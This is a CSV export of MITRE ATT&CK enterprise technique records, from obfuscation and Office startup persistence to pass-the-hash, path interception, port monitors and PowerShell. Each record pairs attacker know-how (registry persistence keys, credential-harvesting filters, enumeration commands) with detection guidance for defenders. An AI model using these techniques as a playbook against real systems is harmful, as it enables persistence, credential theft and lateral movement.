"attack-pattern","attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a","2017-05-31T21:30:32.662Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Obfuscated Files or Information","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system. This is common behavior that can be used across different platforms to evade defenses. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis)

Detection: Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).

Platforms: Linux, macOS, Windows

Data Sources: Network protocol analysis, Process use of network, Binary file metadata, File monitoring, Malware reverse engineering

Defense Bypassed: Host forensic analysis, Signature-based detection, Host intrusion prevention systems","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1027', 'external_id': 'T1027'}, {'source_name': 'Linux/Cdorked.A We Live Security Analysis', 'description': 'Pierre-Marc Bureau. (2013, April 26). Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole. Retrieved September 10, 2017.', 'url': 'https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']"
"attack-pattern","attack-pattern--2c4d4e92-0ccf-4a97-b54c-86d662988a53","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Office Application Startup","Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started.

===Office Template Macros===

Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)

Office Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can inserted into the base templated and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded. (Citation: enigma0x3 normal.dotm) (Citation: Hexacorn Office Template Macros)

Word Normal.dotm location:`C:\Users\(username)\AppData\Roaming\Microsoft\Templates\Normal.dotm`

Excel Personal.xlsb location:`C:\Users\(username)\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB`

An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.

===Office Test===

A Registry location was found that when a DLL reference was placed within it the corresponding DLL pointed to by the binary path would be executed every time an Office application is started (Citation: Hexacorn Office Test)

`HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf`

===Add-ins===

Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins)

Add-ins can also be used to obtain persistence because they can be set to execute code when an Office application starts. There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), and Visual Studio Tools for Office (VSTO) add-ins. (Citation: MRWLabs Office Persistence Add-ins)

Detection: Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence. Modification to base templated, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated.

Monitor and validate the Office trusted locations on the file system and audit the Registry entries relevant for enabling add-ins. (Citation: MRWLabs Office Persistence Add-ins)

Non-standard process execution trees may also indicate suspicious or malicious behavior. Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. If winword.exe is the parent process for suspicious processes and activity relating to other adversarial techniques, then it could indicate that the application was used maliciously.

Platforms: Windows

Data Sources: Process monitoring, Process command-line parameters, Windows Registry, File monitoring

Permissions Required: User, Administrator

System Requirements: Office Test technique: Office 2007, 2010, 2013, 2015 and 2016
Add-ins: some require administrator permissions

Contributors: Ricardo Dias, Loic Jaquemet","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1137', 'external_id': 'T1137'}, {'source_name': 'Microsoft Change Normal Template', 'description': 'Microsoft. (n.d.). Change the Normal template (Normal.dotm). Retrieved July 3, 2017.', 'url': 'https://support.office.com/article/Change-the-Normal-template-Normal-dotm-06de294b-d216-47f6-ab77-ccb5166f98ea'}, {'source_name': 'MSDN VBA in Office', 'description': 'Austin, J. (2017, June 6). Getting Started with VBA in Office. Retrieved July 3, 2017.', 'url': 'https://msdn.microsoft.com/en-us/vba/office-shared-vba/articles/getting-started-with-vba-in-office'}, {'source_name': 'enigma0x3 normal.dotm', 'description': 'Nelson, M. (2014, January 23). Maintaining Access with normal.dotm. Retrieved July 3, 2017.', 'url': 'https://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/comment-page-1/'}, {'source_name': 'Hexacorn Office Template Macros', 'description': 'Hexacorn. (2017, April 17). Beyond good ol’ Run key, Part 62. Retrieved July 3, 2017.', 'url': 'http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/'}, {'source_name': 'Hexacorn Office Test', 'description': 'Hexacorn. (2014, April 16). Beyond good ol’ Run key, Part 10. Retrieved July 3, 2017.', 'url': 'http://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/'}, {'source_name': 'Microsoft Office Add-ins', 'description': 'Microsoft. (n.d.). Add or remove add-ins. Retrieved July 3, 2017.', 'url': 'https://support.office.com/article/Add-or-remove-add-ins-0af570c4-5cf3-4fa9-9b88-403625a0b460'}, {'source_name': 'MRWLabs Office Persistence Add-ins', 'description': 'Knowles, W. (2017, April 21). Add-In Opportunities for Office Persistence. Retrieved July 3, 2017.', 'url': 'https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process monitoring', 'Process command-line parameters', 'Windows Registry', 'File monitoring']","['User', 'Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Ricardo Dias', 'Loic Jaquemet']","","['Office Test technique: Office 2007, 2010, 2013, 2015 and 2016\nAdd-ins: some require administrator permissions']","","",""
"attack-pattern","attack-pattern--c23b740b-a42b-47a1-aec2-9d48ddd547ff","2017-05-31T21:30:59.339Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Pass the Hash","Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems. 

Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes. (Citation: NSA Spotting)

Detection: Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.

Platforms: Windows

Data Sources: Authentication logs

System Requirements: Requires Microsoft Windows as target system

Contributors: Travis Smith, Tripwire","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1075', 'external_id': 'T1075'}, {'source_name': 'NSA Spotting', 'description': 'National Security Agency/Central Security Service Information Assurance Directorate. (2013, December 16). Spotting the Adversary with Windows Event Log Monitoring. Retrieved November 12, 2014.', 'url': 'http://www.nsa.gov/ia/%20files/app/spotting%20the%20adversary%20with%20windows%20event%20log%20monitoring.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Authentication logs']","","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Travis Smith, Tripwire']","","['Requires Microsoft Windows as target system']","","",""
"attack-pattern","attack-pattern--a257ed11-ff3b-4216-8c9d-3938ef57064c","2017-05-31T21:31:11.623Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Pass the Ticket","Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.

In this technique, valid Kerberos tickets for Valid Accounts are captured by Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access. (Citation: ADSecurity AD Kerberos Attacks) (Citation: GentilKiwi Pass the Ticket)

Silver Tickets can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint). (Citation: ADSecurity AD Kerberos Attacks)

Golden Tickets can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory. (Citation: Campbell 2014)

Detection: Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.

Event ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to ""Integrity check on decrypted field failed"" and indicates misuse by a previously invalidated golden ticket. (Citation: CERT-EU Golden Ticket Protection)

Platforms: Windows

Data Sources: Authentication logs

System Requirements: Requires Microsoft Windows as a target system and Kerberos authentication enabled.

Contributors: Ryan Becwar, Vincent Le Toux","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1097', 'external_id': 'T1097'}, {'source_name': 'ADSecurity AD Kerberos Attacks', 'description': 'Metcalf, S. (2014, November 22). Mimikatz and Active Directory Kerberos Attacks. Retrieved June 2, 2016.', 'url': 'https://adsecurity.org/?p=556'}, {'source_name': 'CERT-EU Golden Ticket Protection', 'description': 'Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016, April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.'}, {'source_name': 'Campbell 2014', 'description': 'Campbell, C. (2014). The Secret Life of Krbtgt. Retrieved December 4, 2014.', 'url': 'http://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf'}, {'source_name': 'GentilKiwi Pass the Ticket', 'description': 'Deply, B. (2014, January 13). Pass the ticket. Retrieved June 2, 2016.', 'url': 'http://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Authentication logs']","","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Ryan Becwar', 'Vincent Le Toux']","","['Requires Microsoft Windows as a target system and Kerberos authentication enabled.']","","",""
"attack-pattern","attack-pattern--b8c5c9dd-a662-479d-9428-ae745872537c","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Password Filter DLL","Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as dynamic link libraries (DLLs) containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts.

Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.

Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made. (Citation: Carnal Ownage Password Filters Sept 2013)

Detection: Monitor for change notifications to and from unfamiliar password filters.

Newly installed password filters will not take effect until after a system reboot.

Password filters will show up as an autorun and loaded DLL in lsass.exe. (Citation: Clymb3r Function Hook Passwords Sept 2013)

Platforms: Windows

Data Sources: DLL monitoring, Windows Registry, Process monitoring

Permissions Required: Administrator, SYSTEM

Contributors: Vincent Le Toux","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1174', 'external_id': 'T1174'}, {'source_name': 'Carnal Ownage Password Filters Sept 2013', 'description': 'Fuller, R. (2013, September 11). Stealing passwords every time they change. Retrieved November 21, 2017.', 'url': 'http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html'}, {'source_name': 'Clymb3r Function Hook Passwords Sept 2013', 'description': 'Bialek, J. (2013, September 15). Intercepting Password Changes With Function Hooking. Retrieved November 21, 2017.', 'url': 'https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['DLL monitoring', 'Windows Registry', 'Process monitoring']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Vincent Le Toux']","","","","",""
"attack-pattern","attack-pattern--c4ad009b-6e13-4419-8d21-918a1652de02","2017-05-31T21:30:36.140Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Path Interception","Path interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of cmd in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function. (Citation: TechNet MS14-019)

There are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.

===Unquoted Paths===
Service paths (stored in Windows Registry keys) (Citation: Microsoft Subkey) and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., `C:\unsafe path with space\program.exe` vs. `""C:\safe path with space\program.exe""`). (Citation: Baggett 2012) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is `C:\program files\myapp.exe`, an adversary may create a program at `C:\program.exe` that will be run instead of the intended program.

===PATH Environment Variable Misconfiguration===
The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, `%SystemRoot%\system32` (e.g., `C:\Windows\system32`), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.

For example, if `C:\example path` precedes `C:\Windows\system32` is in the PATH environment variable, a program that is named net.exe and placed in `C:\example path` will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.

===Search Order Hijacking===
Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Hill NT Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.

For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument `net user`. An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then `cmd.exe /C net user` will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT. (Citation: MSDN Environment Property)

Search order hijacking is also a common practice for hijacking DLL loads and is covered in DLL Search Order Hijacking.

Detection: Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as ""findstr,"" ""net,"" and ""python""). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious. 

Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

Platforms: Windows

Data Sources: File monitoring, Process monitoring

Effective Permissions: User, Administrator, SYSTEM

Permissions Required: User, Administrator, SYSTEM

Contributors: Stefan Kanthak","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1034', 'external_id': 'T1034'}, {'source_name': 'TechNet MS14-019', 'description': 'Nagaraju, S. (2014, April 8). MS14-019 – Fixing a binary hijacking via .cmd or .bat file. Retrieved July 25, 2016.', 'url': 'https://blogs.technet.microsoft.com/srd/2014/04/08/ms14-019-fixing-a-binary-hijacking-via-cmd-or-bat-file/'}, {'source_name': 'Microsoft Subkey', 'description': 'Microsoft. (n.d.). CurrentControlSet\\Services Subkey Entries. Retrieved November 30, 2014.', 'url': 'http://support.microsoft.com/KB/103000'}, {'source_name': 'Baggett 2012', 'description': 'Baggett, M. (2012, November 8). Help eliminate unquoted path vulnerabilities. Retrieved December 4, 2014.', 'url': 'https://isc.sans.edu/diary/Help+eliminate+unquoted+path+vulnerabilities/14464'}, {'source_name': 'Microsoft CreateProcess', 'description': 'Microsoft. (n.d.). CreateProcess function. Retrieved December 5, 2014.', 'url': 'http://msdn.microsoft.com/en-us/library/ms682425'}, {'source_name': 'Hill NT Shell', 'description': 'Hill, T. (n.d.). Windows NT Command Shell. Retrieved December 5, 2014.', 'url': 'http://technet.microsoft.com/en-us/library/cc723564.aspx#XSLTsection127121120120'}, {'source_name': 'Microsoft WinExec', 'description': 'Microsoft. (n.d.). WinExec function. Retrieved December 5, 2014.', 'url': 'http://msdn.microsoft.com/en-us/library/ms687393'}, {'source_name': 'MSDN Environment Property', 'description': 'Microsoft. (n.d.). Environment Property. Retrieved July 27, 2016.', 'url': 'https://msdn.microsoft.com/en-us/library/fd7hxfdd.aspx'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process monitoring']","['User', 'Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Stefan Kanthak']","['User', 'Administrator', 'SYSTEM']","","","",""
"attack-pattern","attack-pattern--348f1eef-964b-4eb6-bb53-69b3dcb0c643","2017-05-31T21:31:28.471Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Peripheral Device Discovery","Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Windows

Permissions Required: User, Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1120', 'external_id': 'T1120'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","","['User', 'Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce","2017-05-31T21:30:55.471Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Permission Groups Discovery","Adversaries may attempt to find local system or domain-level groups and permissions settings. 

===Windows===

Examples of commands that can list groups are `net group /domain` and `net localgroup` using the Net utility.

===Mac===

On Mac, this same thing can be accomplished with the `dscacheutil -q group` for the domain, or `dscl . -list /Groups` for local groups.

===Linux===

On Linux, local groups can be enumerated with the `groups` command and domain groups via the `ldapsearch` command.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, Windows, macOS

Data Sources: API monitoring, Process command-line parameters, Process monitoring

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1069', 'external_id': 'T1069'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'Process command-line parameters', 'Process monitoring']","['User']","['Linux', 'Windows', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--06780952-177c-4247-b978-79c357fb311f","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Plist Modification","Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UT-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as `/Library/Preferences` (which execute with elevated privileges) and `~/Library/Preferences` (which execute with a user's privileges). 
Adversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism. (Citation: Sofacy Komplex Trojan)

Detection: File system monitoring can determine if plist files are being modified. Users should not have permission to modify these in most cases. Some software tools like ""Knock Knock"" can detect persistence mechanisms and point to the specific files that are being referenced. This can be helpful to see what is actually being executed.

Monitor process execution for abnormal process execution resulting from modified plist files. Monitor utilities used to modify plist files or that take a plist file as an argument, which may indicate suspicious activity.

Platforms: macOS

Data Sources: File monitoring, Process Monitoring, Process command-line parameters

Defense Bypassed: Application whitelisting, Process whitelisting, Whitelisting by file name or path

Permissions Required: User, Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1150', 'external_id': 'T1150'}, {'source_name': 'Sofacy Komplex Trojan', 'description': ""Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy's 'Komplex' OS X Trojan. Retrieved July 8, 2017."", 'url': 'https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process Monitoring', 'Process command-line parameters']","['User', 'Administrator']","['macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Application whitelisting', 'Process whitelisting', 'Whitelisting by file name or path']"
"attack-pattern","attack-pattern--1f47e2fd-fa77-4f2f-88ee-e85df308f125","2017-05-31T21:30:26.057Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Port Monitors","A port monitor can be set through the  (Citation: AddMonitor) API call to set a DLL to be loaded at startup. (Citation: AddMonitor) This DLL can be located in `C:\Windows\System32` and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. (Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to `HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors`. The Registry key contains entries for the following:
*Local Port
*Standard TCP/IP Port
*USB Monitor
*WSD Port

Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.

Detection: * Monitor process API calls to  (Citation: AddMonitor).
* Monitor DLLs that are loaded by spoolsv.exe for DLLs that are abnormal.
* New DLLs written to the System32 directory that do not correlate with known good software or patching may be suspicious.
* Monitor Registry writes to `HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors`.
* Run the Autoruns utility, which checks for this Registry key as a persistence mechanism (Citation: TechNet Autoruns)

Platforms: Windows

Data Sources: File monitoring, API monitoring, DLL monitoring, Windows Registry, Process monitoring

Effective Permissions: SYSTEM

Permissions Required: Administrator, SYSTEM

Contributors: Stefan Kanthak, Travis Smith, Tripwire","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1013', 'external_id': 'T1013'}, {'source_name': 'AddMonitor', 'description': 'Microsoft. (n.d.). AddMonitor function. Retrieved November 12, 2014.', 'url': 'http://msdn.microsoft.com/en-us/library/dd183341'}, {'source_name': 'Bloxham', 'description': 'Bloxham, B. (n.d.). Getting Windows to Play with Itself &#91;PowerPoint slides&#93;. Retrieved November 12, 2014.', 'url': 'https://www.defcon.org/images/defcon-22/dc-22-presentations/Bloxham/DEFCON-22-Brady-Bloxham-Windows-API-Abuse-UPDATED.pdf'}, {'source_name': 'TechNet Autoruns', 'description': 'Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.', 'url': 'https://technet.microsoft.com/en-us/sysinternals/bb963902'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'API monitoring', 'DLL monitoring', 'Windows Registry', 'Process monitoring']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Stefan Kanthak', 'Travis Smith, Tripwire']","['SYSTEM']","","","",""
"attack-pattern","attack-pattern--f4882e23-8aa7-4b12-b28a-b349c12ee9e0","2017-05-31T21:31:06.512Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","PowerShell","PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. 

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

Administrator permissions are required to use PowerShell to connect to remote systems.

A number of PowerShell-based offensive testing tools are available, including Empire, (Citation: Github PowerShell Empire) PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)

Detection: If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.

It is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution. (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features. (Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.

Platforms: Windows

Data Sources: Windows Registry, File monitoring, Process command-line parameters, Process monitoring

Permissions Required: User, Administrator

Remote Support: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1086', 'external_id': 'T1086'}, {'source_name': 'TechNet PowerShell', 'description': 'Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016.', 'url': 'https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx'}, {'source_name': 'Github PowerShell Empire', 'description': 'Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016.', 'url': 'https://github.com/PowerShellEmpire/Empire'}, {'source_name': 'Powersploit', 'description': 'PowerSploit. (n.d.).  Retrieved December 4, 2014.', 'url': 'https://github.com/mattifestation/PowerSploit'}, {'source_name': 'Github PSAttack', 'description': 'Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016.', 'url': 'https://github.com/jaredhaight/PSAttack'}, {'source_name': 'Malware Archaeology PowerShell Cheat Sheet', 'description': 'Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.', 'url': 